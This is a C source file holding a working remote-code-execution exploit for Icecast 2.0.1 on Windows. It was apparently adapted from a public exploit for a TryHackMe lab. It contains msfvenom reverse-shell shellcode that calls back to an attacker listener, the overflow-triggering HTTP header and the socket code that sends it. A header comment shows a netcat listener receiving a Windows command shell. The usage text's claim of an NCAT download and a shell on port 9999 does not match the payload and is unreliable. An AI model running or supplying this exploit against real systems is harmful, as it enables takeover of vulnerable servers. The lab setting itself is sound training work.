/* 

Original exploit here: https://www.exploit-db.com/exploits/568
I couldn't get this to work so I edited it according to
https://www.exploit-db.com/exploits/573

and made sure the shellcode was executed.

Compile and run
root@Kali:~/TryHackme/Ice# gcc 568-edit.c -o 568
root@Kali:~/TryHackme/Ice# ./568 192.168.92.133

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 192.168.92.133:8000
- send malformed data

Server IS vulnerable!!!

On listener
root@Kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>

*/ 

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
    #include <netinet/in.h> 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ 2048 
#define TIMEOUT 3 
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc" 

// msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -b '\x0a\x0d\x00' -f c
unsigned char shellcode[] =
"\xb8\xf9\xbc\x38\x47\xda\xdb\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\xba\xb2\xda\xb2\xc0\x23\x98"
"\x3d\x38\xb4\xfd\xb4\xdd\x85\x3d\xa2\x96\xb6\x8d\xa0\xfa\x3a"
"\x65\xe4\xee\xc9\x0b\x21\x01\x79\xa1\x17\x2c\x7a\x9a\x64\x2f"
"\xf8\xe1\xb8\x8f\xc1\x29\xcd\xce\x06\x57\x3c\x82\xdf\x13\x93"
"\x32\x6b\x69\x28\xb9\x27\x7f\x28\x5e\xff\x7e\x19\xf1\x8b\xd8"
"\xb9\xf0\x58\x51\xf0\xea\xbd\x5c\x4a\x81\x76\x2a\x4d\x43\x47"
"\xd3\xe2\xaa\x67\x26\xfa\xeb\x40\xd9\x89\x05\xb3\x64\x8a\xd2"
"\xc9\xb2\x1f\xc0\x6a\x30\x87\x2c\x8a\x95\x5e\xa7\x80\x52\x14"
"\xef\x84\x65\xf9\x84\xb1\xee\xfc\x4a\x30\xb4\xda\x4e\x18\x6e"
"\x42\xd7\xc4\xc1\x7b\x07\xa7\xbe\xd9\x4c\x4a\xaa\x53\x0f\x03"
"\x1f\x5e\xaf\xd3\x37\xe9\xdc\xe1\x98\x41\x4a\x4a\x50\x4c\x8d"
"\xad\x4b\x28\x01\x50\x74\x49\x08\x97\x20\x19\x22\x3e\x49\xf2"
"\xb2\xbf\x9c\x55\xe2\x6f\x4f\x16\x52\xd0\x3f\xfe\xb8\xdf\x60"
"\x1e\xc3\x35\x09\xb5\x3e\xde\x3c\x41\x60\x47\x29\x57\x60\x66"
"\xf5\xde\x86\xe2\x15\xb7\x11\x9b\x8c\x92\xe9\x3a\x50\x09\x94"
"\x7d\xda\xbe\x69\x33\x2b\xca\x79\xa4\xdb\x81\x23\x63\xe3\x3f"
"\x4b\xef\x76\xa4\x8b\x66\x6b\x73\xdc\x2f\x5d\x8a\x88\xdd\xc4"
"\x24\xae\x1f\x90\x0f\x6a\xc4\x61\x91\x73\x89\xde\xb5\x63\x57"
"\xde\xf1\xd7\x07\x89\xaf\x81\xe1\x63\x1e\x7b\xb8\xd8\xc8\xeb"
"\x3d\x13\xcb\x6d\x42\x7e\xbd\x91\xf3\xd7\xf8\xae\x3c\xb0\x0c"
"\xd7\x20\x20\xf2\x02\xe1\x50\xb9\x0e\x40\xf9\x64\xdb\xd0\x64"
"\x97\x36\x16\x91\x14\xb2\xe7\x66\x04\xb7\xe2\x23\x82\x24\x9f"
"\x3c\x67\x4a\x0c\x3c\xa2";


/* 
in my example 0xcc is used to interrupt the code execution, you must 
put your shellcode exactly there. 
You don't need to call a shellcode offset (CALL ESP, JMP ESP and so 
on) or doing any other annoying operation because the code flow 
points directly there!!! 
Cool and easy 8-) 
*/ 


/*int startWinsock(void) 
{ 
  WSADATA wsa; 
  return WSAStartup(MAKEWORD(2,0),&wsa); 
} 
*/
int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 

int main(int argc, char *argv[]) { 
    struct sockaddr_in peer; 
    int sd; 
    u_short port = PORT; 
    u_char buff[BUFFSZ]; 
    u_char buf[4096]; 
    u_char *pointer=NULL; 

    setbuf(stdout, NULL); 

    fputs("\n" 
        "Icecast <= 2.0.1 Win32 remote code execution "VER"\n" 
        "by Luigi Auriemma\n" 
        "e-mail: aluigi@altervista.org\n" 
        "web:http://aluigi.altervista.org\n" 
  "\nshellcode add-on by Delikon\n" 
  "www.delikon.de" 
        "\n", stdout); 

    if(argc < 2) { 
        printf("\nUsage: %s <server> [port(%d)]\n" 
            "\n" 
            "Note: This exploit will force the Icecast server to download NCAT\n" 
            "and after execution it will spwan a shell on 9999\n" 
            "\n", argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]); 

    peer.sin_addr.s_addr = resolv(argv[1]); 
    peer.sin_port= htons(port); 
    peer.sin_family= AF_INET; 

    memset(buf,0x00,sizeof(buf)); 
    strcpy(buf,EXEC); 
    
pointer =strrchr(buf,0xcc); 

strcpy(pointer,shellcode); 

strcat(buf,"\r\n"); 
strcat(buf,"\r\n"); 
    

    printf("\n- target %s:%hu\n", 
        inet_ntoa(peer.sin_addr), port); 

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if(sd < 0) std_err(); 

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) 
      < 0) std_err(); 

    fputs("- send malformed data\n", stdout); 
    if(send(sd, buf, strlen(buf), 0) 
      < 0) std_err(); 

    if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) < 0)) { 
        fputs("\nServer IS vulnerable!!!\n\n", stdout); 
    } else { 
        fputs("\nServer doesn't seem vulnerable\n\n", stdout); 
    } 

    close(sd); 
    return(0); 
} 

int timeout(int sock) { 
    struct timeval tout; 
    fd_set fd_read; 
    int err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&fd_read); 
    FD_SET(sock, &fd_read); 
    err = select(sock + 1, &fd_read, NULL, NULL, &tout); 
    if(err < 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 

u_long resolv(char *host) { 
    struct hostent *hp; 
    u_long host_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf("\nError: Unable to resolve hostname (%s)\n", host); 
            exit(1); 
        } else host_ip = *(u_long *)(hp->h_addr); 
    } 
    return(host_ip); 
} 

#ifndef WIN32 
    void std_err(void) { 
        exit(1); 
    } 
#endif 

// milw0rm.com [2004-10-06]